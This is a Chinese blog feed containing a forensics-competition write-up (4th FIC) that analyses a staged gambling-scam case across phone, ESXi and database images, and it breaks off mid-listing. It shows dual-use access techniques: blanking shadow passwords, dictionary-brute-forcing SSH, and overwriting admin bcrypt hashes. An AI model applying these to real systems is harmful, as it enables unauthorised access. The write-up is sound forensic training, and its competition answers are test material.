<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>cvbxy&#39;s blog</title>
  
  
  <link href="https://cvbxy.github.io/atom.xml" rel="self"/>
  
  <link href="https://cvbxy.github.io/"/>
  <updated>2024-06-19T12:41:38.263Z</updated>
  <id>https://cvbxy.github.io/</id>
  
  <author>
    <name>cvbxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第四届FIC取证竞赛</title>
    <link href="https://cvbxy.github.io/2024/06/19/FIC/"/>
    <id>https://cvbxy.github.io/2024/06/19/FIC/</id>
    <published>2024-06-19T05:59:11.000Z</published>
    <updated>2024-06-19T12:41:38.263Z</updated>
    
    <content type="html"><![CDATA[<p>案情简介：<br>2024年4月，卢某报案至警方，声称自己疑似遭受了“杀猪盘”诈骗，大量钱财被骗走。卢某透露，在与某公司交流过程中结识了员工李某。李某私下诱导卢某参与赌博游戏，起初资金出入均属正常。但随后，李某称赌博平台为提升安全性，更换了地址和玩法，转为通过群聊抢红包形式进行赌博。随着赌资不断增加，卢某投入巨额资金后，发现无法再访问该网站，同时李某也失去联系，卢某遂意识到自己被骗。在经济压力下，卢某选择报警，并承认参与赌博活动，愿意承担相应法律后果。警方依据卢某提供的线索和手机数据，迅速锁定犯罪团伙，并在一藏匿地点成功抓获犯罪嫌疑人李某和赵某。警方对嫌疑人持有的物品进行了证据固定：李某手机被标记为检材1，窝点内服务器为检材2，赵某使用的计算机为检材3。<br>接下来，请取证工作者根据案情和这些检材进行深入分析，并解答后续问题。</p><h1 id="手机部分"><a href="#手机部分" class="headerlink" title="手机部分"></a>手机部分</h1><blockquote><p>嫌疑人李某的手机型号是？<br>A. Xiaomi MI 2s<br>B. Xiaomi MI 4<br>C. Xiaomi MI 6<br>D. Xiaomi MI 8</p><p>B</p></blockquote><p><img src="/img/blogimg/2024061909393112.png" alt="image.png"><br><code>/data/system/users/0/settings_global.xml</code><br><img src="/img/blogimg/2024061909393114.png" alt="image.png"></p><blockquote><p>嫌疑人李某是否可能有平板电脑设备，如有该设备型号是？<br>A. iPad Pro 11<br>B. Vivo Pad 2<br>C. MatePad Pro<br>D. Xiaomi Pad 6s</p><p>D</p></blockquote><p><img src="/img/blogimg/2024061909393223.png" alt="image.png"><br><code>/data/misc/wifi/WifiConfigStore.xml</code><br><img src="/img/blogimg/2024061909393225.png" alt="image.png"></p><blockquote><p>嫌疑人李某手机开启热点设置的密码是?【答题格式：abc123】<br>5aada11bc1b5</p></blockquote><p><img src="/img/blogimg/2024061909393229.png" alt="image.png"><br><code>/data/misc/wifi/softap.conf</code><br><img src="/img/blogimg/2024061909393331.png" alt="image.png"></p><blockquote><p>嫌疑人李某的微信内部ID是？【答题格式：wxid_abc123】<br>wxid_wnigmud8aj6j12</p></blockquote><p><img src="/img/blogimg/2024061909393335.png" alt="image.png"><br>在<code>/data/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml</code>中找到<code>_auth_uin</code>的值<br><img src="/img/blogimg/2024061909393337.png" alt="image.png"><br><img src="/img/blogimg/2024061909393438.png" alt="image.png"><br>微信的本地数据库存放在<code>/data/data/com.tencent.mm/MicroMsg</code>里面的一长串字符串的目录里面，导出这个数据库文件<br><img src="/img/blogimg/2024061909393440.png" alt="image.png"><br><img src="/img/blogimg/2024061909393441.png" alt="image.png"></p><blockquote><p>嫌疑人李某发送给技术人员的网站源码下载地址是什么 【答题格式：<a href="http://www.baidu.com/adc%E3%80%91">http://www.baidu.com/adc】</a><br><a href="http://www.honglian7001.com/down">http://www.honglian7001.com/down</a></p></blockquote><p>和赵老五的聊天记录中提到了网站代码，扫一扫<br><img src="/img/blogimg/2024061909393446.png" alt="image.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">新佛曰：諸隸僧殿降吽諸陀摩隸殿僧殿缽殿薩願僧殿宣摩殿嚴願殿是迦咒叻吶嚤須塞亦須阿隸嚤須愍眾殿蜜殿隸願蜜哆蜜亦願是念慧殿隸摩哆殿即隸嚤訶須隸亦愍如如殿囑殿囑<br></code></pre></td></tr></table></figure><p>在线解密：<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a><br><img src="/img/blogimg/2024061909393551.png" alt="image.png"><br>DB Browser查看解密后的数据库文件<br><img src="/img/blogimg/2024061909393553.png" alt="image.png"><br><img src="/img/blogimg/2024061909393554.png" alt="image.png"><br>后面的步骤和上面一样</p><blockquote><p>受害者微信用户ID是？【答题格式：abc123】<br>limoon890</p></blockquote><p>limoon被骗5000，查看他的ID<br><img src="/img/blogimg/2024061909393660.png" alt="image.png"><img src="/img/blogimg/2024061909393760.png" alt="image.png"><br><img src="/img/blogimg/2024061909393661.png" alt="image.png"><br><img src="/img/blogimg/2024061909393662.png" alt="image.png"></p><blockquote><p>嫌疑人李某第一次连接WIFI的时间是？<br>A. 03-14 15:55:57<br>B. 03-14 16:55:57<br>C. 03-14 17:55:57<br>D. 03-14 18:55:57</p><p>B</p></blockquote><p><code>/data/misc/wifi/WifiConfigStore.xml</code><br><img src="/img/blogimg/2024061909393770.png" alt="image.png"></p><blockquote><p>分析嫌疑人李某的社交习惯，哪一个时间段消息收发最活跃？<br>A. 12:00-14:00<br>B. 14:00-16:00<br>C. 16:00-18:00<br>D. 18:00-20:00</p><p>C</p></blockquote><p>火眼看聊天记录，大部分记录都在16:00-18:00<br>看数据库的create time，转换一下时间戳<br><img src="/img/blogimg/2024061909393779.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_time</span>(<span class="hljs-params">timestamp</span>):<br>    dt = datetime.datetime.fromtimestamp(timestamp//<span class="hljs-number">1000</span>)<br>    format_time = dt.strftime(<span class="hljs-string">&#x27;%Y年%m月%d日%H时%M分%S秒&#x27;</span>)<br>    <span class="hljs-keyword">return</span> format_time<br><br>conn = sqlite3.connect(<span class="hljs-string">&#x27;./EnMicroMsg_dec.db&#x27;</span>)<br>cursor = conn.cursor()<br>sql = <span class="hljs-string">&#x27;select createTime from message&#x27;</span><br>cursor.execute(sql)<br>data = cursor.fetchall()<br>cnt = &#123;&#125;<br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;日(.*?)时&#x27;</span>)<br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> data:<br>    createTime = re.findall(pattern,get_time(v[<span class="hljs-number">0</span>]))[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> createTime <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cnt.keys():<br>        cnt[createTime] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        cnt[createTime] += <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(cnt)<br><br><span class="hljs-comment"># &#123;&#x27;16&#x27;: 52, &#x27;17&#x27;: 55, &#x27;15&#x27;: 3, &#x27;18&#x27;: 10, &#x27;13&#x27;: 17, &#x27;14&#x27;: 12, &#x27;20&#x27;: 23&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>请分析嫌疑人手机，该案件团伙中，还有一名重要参与者警方未抓获，该嫌疑人所使用的微信账号ID为？【答题格式：wxid_abc123】<br>wxid_kolc5oaiap6z22</p></blockquote><p>对比聊天记录和案情简介，还有一个叫老苏的<br><img src="/img/blogimg/20240619093937111.png" alt="image.png"><br><img src="/img/blogimg/20240619093937112.png" alt="image.png"><br><img src="/img/blogimg/20240619093938113.png" alt="image.png"></p><blockquote><p>请分析嫌疑人手机，嫌疑人老板组织人员参与赌博活动，所使用的国内访问入口地址为？【答题格式：192.168.1.1:1000&#x2F;abc】<br>192.168.110.110:8000&#x2F;login</p></blockquote><p><img src="/img/blogimg/20240619093938117.png" alt="image.png"><br><img src="/img/blogimg/20240619093938118.png" alt="image.png"></p><h1 id="服务器集群题"><a href="#服务器集群题" class="headerlink" title="服务器集群题"></a>服务器集群题</h1><p>挂载镜像，用低版本的ftk挂载，别的会出问题<br><img src="/img/blogimg/20240619093938121.png" alt="image.png"><br><img src="/img/blogimg/20240619093939122.png" alt="image.png"><br>手工绕密：<br>打开FTK挂载出来的虚拟磁盘，在250MB大小的一个分区找到STATE.TGZ文件，7z逐层解压，直接在目录中点击编辑即可修改shadow文件，置空后保存即可<br><img src="/img/blogimg/20240619093939125.png" alt="image.png"><br><img src="/img/blogimg/20240619093939126.png" alt="image.png"></p><blockquote><p>esxi服务器的esxi版本为？【关键字得分，答题格式：1.2】<br>6.7</p></blockquote><p>火眼识别<br><img src="/img/blogimg/20240619093939131.png" alt="image.png"><br>管理员权限打开VMware进行仿真<br><img src="/img/blogimg/20240619093940133.png" alt="image.png"><br><img src="/img/blogimg/20240619093940134.png" alt="image.png"></p><blockquote><p>请分析ESXi服务器，该系统的安装日期为：<br>2024 年 3 月 12 日 星期二 02:04:15 UTC<br>2024 年 3 月 12 日 星期二 02:05:15 UTC<br>2024 年 3 月 12 日 星期二 02:06:15 UTC<br>2024 年 3 月 12 日 星期二 02:07:15 UTC</p><p>A</p></blockquote><p>配置网卡进入esxi<br><img src="/img/blogimg/20240619093940142.png" alt="image.png"><br><img src="/img/blogimg/20240619093940143.png" alt="image.png"><br><img src="/img/blogimg/20240619093941144.png" alt="image.png"><br><img src="/img/blogimg/20240619093941145.png" alt="image.png"><img src="/img/blogimg/20240619093942145.png" alt="image.png"><br><img src="/img/blogimg/20240619093941146.png" alt="image.png"><br><img src="/img/blogimg/20240619093942147.png" alt="image.png"><br>弄好网卡记得虚拟化，不然等会开里面的虚拟机还得重启然后虚拟化，得重新挂载数据(火眼仿真会丢失数据盘，赛后已修复)<br><img src="/img/blogimg/20240619093942149.png" alt="image.png"><br><img src="/img/blogimg/20240619093942150.png" alt="image.png"><br>root加空密码就能进<br><img src="/img/blogimg/20240619093942152.png" alt="image.png"></p><blockquote><p>请分析ESXi服务器数据存储“datastore”的UUID是？【答题格式：a1a1-b1b1-c1c1-d1d1】<br>65efb8a8-ddd817f6-04ff-000c297bd0e6</p></blockquote><p>没有存储，但是有设备，可能是丢失了数据，需要重新挂载<br><a href="https://mp.weixin.qq.com/s/1rFGJnYw59DfId8fWKTGdA">https://mp.weixin.qq.com/s/1rFGJnYw59DfId8fWKTGdA</a><br><img src="/img/blogimg/20240619093943158.png" alt="image.png"><br><img src="/img/blogimg/20240619093943159.png" alt="image.png"><br>ssh直接连接，root加空密码，如何重新挂载一下数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost:~] esxcfg-volume -l<br>Scanning <span class="hljs-keyword">for</span> VMFS-6 host activity (4096 bytes/HB, 1024 HBs).<br>VMFS UUID/label: 65efb8a8-ddd817f6-04ff-000c297bd0e6/datastore1<br>Can mount: Yes<br>Can resignature: Yes<br>Extent name: t10.ATA_____VMware_Virtual_IDE_Hard_Drive___________00000000000000000001:3 range: 0 - 197119 (MB)<br><br>[root@localhost:~] esxcfg-volume -m 65efb8a8-ddd817f6-04ff-000c297bd0e6<br>Mounting volume 65efb8a8-ddd817f6-04ff-000c297bd0e6<br>[root@localhost:~] <br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619093943173.png" alt="image.png"><br>回到网页刷新一下就好了<br><img src="/img/blogimg/20240619093944175.png" alt="image.png"></p><blockquote><p>ESXI服务器的原IP地址？【答题格式：255.255.255.0】<br>192.168.8.112</p></blockquote><p><img src="/img/blogimg/20240619093944179.png" alt="image.png"></p><blockquote><p>EXSI服务器中共创建了几个虚拟机？【答题格式：1】<br>4</p></blockquote><p>（其实有5个，有一个是坏的，可能火眼仿真没有加载）<br><img src="/img/blogimg/20240619093944184.png" alt="image.png"><br><img src="/img/blogimg/20240619093945185.png" alt="image.png"></p><blockquote><p>网站服务器绑定的IP地址为？【答题格式：255.255.255.0】<br>192.168.8.89</p></blockquote><p><img src="/img/blogimg/20240619093945189.png" alt="image.png"><br>把esxi里面的虚拟机全部开开<br><img src="/img/blogimg/20240619093945191.png" alt="image.png"><br>查看www的网络信息（可能得等一会，或者要先从网页的控制台连上去一下，不然IP一直不显示），访问该ip<br><img src="/img/blogimg/20240619093946193.png" alt="image.png"><br><img src="/img/blogimg/20240619093946194.png" alt="image.png"></p><blockquote><p>网站服务器的登录密码为？【答题格式：abc123】<br>qqqqqq</p></blockquote><p>用Windows镜像里面的字典爆破一下www的密码<br><img src="/img/blogimg/20240619093947199.png" alt="image.png"></p><blockquote><p>网站服务器所使用的管理面板登陆入口地址对应的端口号为：【答案格式：1111】<br>14131</p></blockquote><p>ssh连接www，www的www目录下面有宝塔相关的东西，猜测可能是宝塔面板搭建的，输入bt测一下<br><img src="/img/blogimg/20240619093947204.png" alt="image.png"><br><img src="/img/blogimg/20240619093947205.png" alt="image.png"><br>查看bt默认信息<br><img src="/img/blogimg/20240619093948207.png" alt="image.png"></p><blockquote><p>网站服务器的web目录是？【答题格式：&#x2F;etc】<br>&#x2F;webapp</p></blockquote><p>改掉bt面板的密码，然后登录bt面板<br><img src="/img/blogimg/20240619093948212.png" alt="image.png"><br>宝塔面板里面的网站里面没有东西，但是&#x2F;webapp目录下有源码，所有应该是&#x2F;webapp<br><img src="/img/blogimg/20240619093948214.png" alt="image.png"></p><p><img src="/img/blogimg/640-1718775390765-3.png" alt="1"></p><blockquote><p>网站配置中Redis的连接超时时间为多少秒 【答题格式：20】<br>10</p></blockquote><p><img src="/img/blogimg/20240619093949218.png" alt="image.png"></p><blockquote><p>网站普通用户密码中使用的盐值为 【答题格式：123abc!@#】<br>!@#qaaxcfvghhjllj788+)_)((</p></blockquote><p><img src="/img/blogimg/20240619093949222.png" alt="image.png"><br>UserController中有调用加密函数，查看这个函数<br><img src="/img/blogimg/20240619093949224.png" alt="image.png"><br>可知第二个参数就是salt<br><img src="/img/blogimg/20240619093949226.png" alt="image.png"></p><blockquote><p>网站管理员用户密码的加密算法名称是什么<br>A.des<br>B.rsa<br>C.md5<br>D.bcrypt</p><p>D</p></blockquote><p>ruoyi的管理员密码生成类在com.ruoyi.common.utils.SecurityUtils<br><img src="/img/blogimg/20240619093950234.png" alt="image.png"></p><blockquote><p>网站超级管理员用户账号创建的时间是？<br>A.2022-05-09 12:44:41<br>B.2022-05-09 13:44:41<br>C.2022-05-09 14:44:41<br>D.2022-05-09 15:44:41</p><p>C</p></blockquote><p>访问网站会报接口异常<br><img src="/img/blogimg/20240619093950242.png" alt="image.png"><br>看jar包中的数据库用的本地的，但是本地无法登录数据库<br><img src="/img/blogimg/20240619093950244.png" alt="image.png"><br><img src="/img/blogimg/20240619093951245.png" alt="image.png"><br>宝塔面板显示数据库的地址是192.168.8.142，对应名为data的虚拟机<br><img src="/img/blogimg/20240619093951247.png" alt="image.png"><br>爆破ssh，然后连接<br><img src="/img/blogimg/20240619093951249.png" alt="image.png"><br>发现没有mysql<br><img src="/img/blogimg/20240619093951251.png" alt="image.png"><br>结合后面的题目，应该是有docker，启动docker<br><img src="/img/blogimg/20240619093952253.png" alt="image.png"><br>启动mysql<br><img src="/img/blogimg/20240619093952255.png" alt="image.png"><br>连一下数据库<br><img src="/img/blogimg/20240619093952257.png" alt="image.png"><br><img src="/img/blogimg/20240619093953258.png" alt="image.png"></p><blockquote><p>重构进入网站之后，用户管理下的用户列表页面默认有多少页数据 【答题格式：20】<br>877</p></blockquote><p>在www虚拟机中提取出ruoyi-admin.jar的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar xf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml<br></code></pre></td></tr></table></figure><p>使用vim命令修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim BOOT-INF/classes/application-druid.yml<br></code></pre></td></tr></table></figure><p>将数据库地址修改为data虚拟机的ip，密码修改成宝塔面板中的密码<br><img src="/img/blogimg/20240619093953271.png" alt="image.png"><br>更新配置文件到jar包内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar uf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml<br></code></pre></td></tr></table></figure><p>查看修改时间，时间变了即为修改成功<br><img src="/img/blogimg/20240619093953277.png" alt="image.png"><br>运行restart.sh<br><img src="/img/blogimg/20240619093954279.png" alt="image.png"><br>还是502异常，参考运维笔记，修改一下redis的配置文件<br><img src="/img/blogimg/20240619093954281.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost webapp]<span class="hljs-comment"># jar xf ruoyi-admin.jar BOOT-INF/classes/application.yml</span><br>[root@localhost webapp]<span class="hljs-comment"># vim BOOT-INF/classes/application.yml</span><br>[root@localhost webapp]<span class="hljs-comment"># jar uf ruoyi-admin.jar BOOT-INF/classes/application.yml</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619093954287.png" alt="image.png"><br>定时任务插件执行时间问题在sys_job表中，将下面的在2023年和2024 年的每个1月1日执行任务替换成上面的在每小时的每隔两分钟触发一次，直到任务被停止或调度器关闭为止<br><img src="/img/blogimg/20240619093954289.png" alt="image.png"><br><img src="/img/blogimg/20240619093955290.png" alt="image.png"><br>启动后端<br><img src="/img/blogimg/20240619093955292.png" alt="image.png"><br><img src="/img/blogimg/20240619093955293.png" alt="image.png"><br>没有报错，可以正常访问了<br>使用<a href="https://www.bejson.com/encrypt/bcrpyt_encode/%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E5%AF%86%E7%A0%81%EF%BC%8C%E6%9B%BF%E6%8D%A2%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84sys_user%E8%A1%A8%E4%B8%AD">https://www.bejson.com/encrypt/bcrpyt_encode/生成一个密码，替换到数据库中的sys_user表中</a><br><img src="/img/blogimg/20240619093955296.png" alt="image.png"><br><img src="/img/blogimg/20240619093956297.png" alt="image.png"><br>正常登录，一共877页<br><img src="/img/blogimg/20240619093956299.png" alt="image.png"></p><blockquote><p>该网站的系统接口文档版本号为 【答题格式：1.1.1】<br>3.8.2</p></blockquote><p><img src="/img/blogimg/20240619093956303.png" alt="image.png"></p><blockquote><p>该网站获取订单列表的接口 【答题格式：&#x2F;abc&#x2F;abc】<br>&#x2F;api&#x2F;shopOrder</p></blockquote><p><img src="/img/blogimg/20240619093957307.png" alt="image.png"></p><blockquote><p>受害人卢某的用户ID 【答题格式：11223344】<br>10044888</p></blockquote><p><img src="/img/blogimg/20240619093957311.png" alt="image.png"><br><img src="/img/blogimg/20240619093957312.png" alt="image.png"></p><blockquote><p>受害人卢某一共充值了多少钱 【答题格式：123456】<br>465222</p></blockquote><p><img src="/img/blogimg/20240619093957316.png" alt="image.png"></p><blockquote><p>网站设置的单次抽奖价格为多少元 【答题格式：20】<br>10</p></blockquote><p><img src="/img/blogimg/20240619093958320.png" alt="image.png"></p><blockquote><p>网站显示的总余额数是 【答题格式：20.12】<br>7354468.56</p></blockquote><p><img src="/img/blogimg/20240619093958324.png" alt="image.png"></p><blockquote><p>网站数据库的root密码 【答题格式：abc123】<br>my-secret-pw</p></blockquote><p>查看容器的元数据<br><img src="/img/blogimg/20240619093958329.png" alt="image.png"><br>navicat测试连接<br><img src="/img/blogimg/20240619093959331.png" alt="image.png"></p><blockquote><p>数据库服务器的操作系统版本是 【答题格式：1.2.1234】<br>7.9.2009</p></blockquote><p><img src="/img/blogimg/20240619093959335.png" alt="image.png"></p><blockquote><p>数据库服务器的Docker Server版本是 【答题格式：1.10.0】<br>1.13.1</p></blockquote><p><img src="/img/blogimg/20240619093959339.png" alt="image.png"></p><blockquote><p>数据库服务器中数据库容器的完整ID是 【答题格式：123abcd】<br>9bf1cecec3957a5cd23c24c0915b7d3dd9be5238322ca5646e3d9e708371b765</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># docker ps -a --no-trunc</span><br>CONTAINER ID                                                       IMAGE               COMMAND                         CREATED             STATUS              PORTS                    NAMES<br>9bf1cecec3957a5cd23c24c0915b7d3dd9be5238322ca5646e3d9e708371b765   eclipse/mysql       <span class="hljs-string">&quot;docker-entrypoint.sh mysqld&quot;</span>   6 weeks ago         Up 36 minutes       0.0.0.0:3306-&gt;3306/tcp   mysql<br></code></pre></td></tr></table></figure><p>或者<code>docker inspect 9</code></p><blockquote><p>数据库服务器中数据库容器使用的镜像ID 【答题格式：123abcd】<br>66c0e7ca4921</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># docker images -a --no-trunc</span><br>REPOSITORY                TAG                 IMAGE ID                                                                  CREATED             SIZE<br>docker.io/eclipse/mysql   latest              sha256:66c0e7ca4921e941cbdbda9e92242f07fe37c2bcbbaac4af701b4934dfc41d8a   6 years ago         436 MB<br>[root@localhost ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><blockquote><p>数据库服务器中数据库容器创建的北京时间<br>A.2024&#x2F;3&#x2F;13  12:15:23<br>B.2024&#x2F;3&#x2F;13  20:15:23<br>C.2024&#x2F;3&#x2F;14  00:15:23<br>D.2024&#x2F;3&#x2F;13  08:15:23</p><p>B</p></blockquote><p><img src="/img/blogimg/20240619093959364.png" alt="image.png"><br>在 Docker 中运行的 MySQL 容器默认使用的是世界标准时间（UTC）需要+8</p><blockquote><p>数据库服务器中数据库容器的ip是 【答题格式：255.255.255.0】<br>172.17.0.2</p></blockquote><p><img src="/img/blogimg/20240619094000369.png" alt="image.png"></p><blockquote><p>分析数据库数据，在该平台邀请用户进群最多的用户的登录IP是 【答题格式：255.255.255.0】<br>223.104.51.34</p></blockquote><p>邀请进群相关数据在app_group_apply表，筛选一下邀请人数最多的inviter_id</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> inviter_id <span class="hljs-keyword">AS</span> 邀请人ID,<span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> 邀请人数 <span class="hljs-keyword">FROM</span> `app_group_apply` <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> inviter_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> 邀请人数 <span class="hljs-keyword">DESC</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094000377.png" alt="image.png"><br>到app_user_info表找到对应用户的登录IP</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> login_ip <span class="hljs-keyword">FROM</span> `app_user_info` <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">53576061</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094000382.png" alt="image.png"></p><blockquote><p>分析数据库数据，在该平台抢得最多红包金额的用户的登录IP是 【答题格式：255.255.255.0】<br>116.62.104.130</p></blockquote><p>抢红包记录在app_group_redpacket_member表中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">SUM</span>(money) <span class="hljs-keyword">AS</span> 总金额<br><span class="hljs-keyword">FROM</span> `app_group_redpacket_member`<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> 总金额 <span class="hljs-keyword">DESC</span><br><br><span class="hljs-keyword">SELECT</span> login_ip <span class="hljs-keyword">FROM</span> `app_user_info` <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">90671142</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094000394.png" alt="image.png"><br><img src="/img/blogimg/20240619094001395.png" alt="image.png"></p><blockquote><p>数据库中记录的提现成功的金额总记是多少（不考虑手续费） 【答题格式：20.12】<br>35821148.48</p></blockquote><p>提现记录在app_user_withdraw表中<br><img src="/img/blogimg/20240619094001400.png" alt="image.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">FROM</span> `app_user_withdraw` <span class="hljs-keyword">WHERE</span> `status` <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094001404.png" alt="image.png"></p><blockquote><p>rocketchat服务器中，有几个真实用户？【答题格式：1】<br>3</p></blockquote><p><img src="/img/blogimg/20240619094002408.png" alt="image.png"><br>根据赵某的计算机Chrome浏览器记录，聊天系统应该是在3000端口上，访问<a href="http://192.168.8.16:3000/home">http://192.168.8.16:3000/home</a><br><img src="/img/blogimg/20240619094002410.png" alt="image.png"><br>用之前的账户密码登录</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">admin</span>@<span class="hljs-literal">admin</span>.com<br>Zhao<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094002416.png" alt="image.png"></p><blockquote><p>rocketchat服务器中，聊天服务的端口号是？ 【答题格式：80】<br>3000</p></blockquote><p>见上题</p><blockquote><p>rocketchat服务器中，聊天服务的管理员的邮箱是？【答题格式：<a href="mailto:&#97;&#x62;&#99;&#x40;&#x61;&#x62;&#x63;&#46;&#99;&#x6f;&#109;">&#97;&#x62;&#99;&#x40;&#x61;&#x62;&#x63;&#46;&#99;&#x6f;&#109;</a>】<br><a href="mailto:&#97;&#100;&#109;&#x69;&#110;&#64;&#x61;&#x64;&#x6d;&#105;&#110;&#46;&#99;&#x6f;&#x6d;">&#97;&#100;&#109;&#x69;&#110;&#64;&#x61;&#x64;&#x6d;&#105;&#110;&#46;&#99;&#x6f;&#x6d;</a></p></blockquote><p><img src="/img/blogimg/20240619094003424.png" alt="image.png"></p><blockquote><p>rocketchat服务器中，聊天服务使用的数据库的版本号是？【答题格式：1.2.34】<br>5.0.24</p></blockquote><p><img src="/img/blogimg/20240619094003428.png" alt="image.png"><br><img src="/img/blogimg/20240619094003429.png" alt="image.png"></p><blockquote><p>rocketchat服务器中，最大的文件上传大小是？（以字节为单位）【答题格式：1024】<br>104857600</p></blockquote><p><img src="/img/blogimg/20240619094004433.png" alt="image.png"></p><blockquote><p>rocketchat服务器中，管理员账号的创建时间为？<br>A.2024&#x2F;3&#x2F;14  8:18:54<br>B.2024&#x2F;3&#x2F;14  8:19:54<br>C.2024&#x2F;3&#x2F;14  8:17:54<br>D.2024&#x2F;3&#x2F;14  8:15:54</p><p>B</p></blockquote><p>密码表爆不出来这台服务器的密码，参考<a href="https://cn.linux-console.net/?p=1538%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81">https://cn.linux-console.net/?p=1538重置密码</a><br><img src="/img/blogimg/20240619094004441.png" alt="image.png"><br>ssh登录被拒，可能是没开远程ssh，修改一下配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>ssh/sshd_config<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094004446.png" alt="image.png"><br>修改完重启ssh即可<br><img src="/img/blogimg/20240619094005448.png" alt="image.png"><br>可以看到数据库运行在docker里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@debian:~<span class="hljs-comment"># docker ps</span><br>CONTAINER ID   IMAGE                                                COMMAND                  CREATED       STATUS         PORTS                    NAMES<br>160c806d13ea   registry.rocket.chat/rocketchat/rocket.chat:latest   <span 